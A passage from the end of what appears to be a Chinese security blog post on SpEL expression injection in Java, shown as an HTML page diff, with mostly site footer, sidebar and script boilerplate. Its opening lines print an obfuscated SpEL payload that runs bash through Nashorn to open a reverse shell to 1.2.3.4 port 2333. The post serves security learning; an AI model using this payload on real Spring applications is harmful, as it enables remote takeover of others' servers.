'-'`"&#125;)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用 ScriptEngineManager 构造</span></span><br><span class="line">#&#123;T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='ex"+"ec 5&lt;&gt;/dev/tcp/1.2.3.4/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+          
+            <a href="/tags/java/" rel="tag"><i class="fa fa-tag"></i> java</a>
+          
+            <a href="/tags/SpEL/" rel="tag"><i class="fa fa-tag"></i> SpEL</a>
+          
+            <a href="/tags/注入/" rel="tag"><i class="fa fa-tag"></i> 注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/23/反弹 shell/" rel="next" title="Linux 反弹 shell">
+                <i class="fa fa-chevron-left"></i> Linux 反弹 shell
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/23/Java 反射机制/" rel="prev" title="Java 反射机制">
+                Java 反射机制 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/toux.jpg" alt="peri0d">
+            
+              <p class="site-author-name" itemprop="name">peri0d</p>
+              <p class="site-description motion-element" itemprop="description">待我尝尽世间甘苦，便喂你一勺甜。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://buuoj.cn" title="BUUCTF" target="_blank">BUUCTF</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://adworld.xctf.org.cn/" title="攻防世界" target="_blank">攻防世界</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SpEL-简介"><span class="nav-number">1.</span> <span class="nav-text">SpEL 简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SpEL-表达式"><span class="nav-number">2.</span> <span class="nav-text">SpEL 表达式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SpEL-中的-RCE"><span class="nav-number">3.</span> <span class="nav-text">SpEL 中的 RCE</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">peri0d</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="true"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
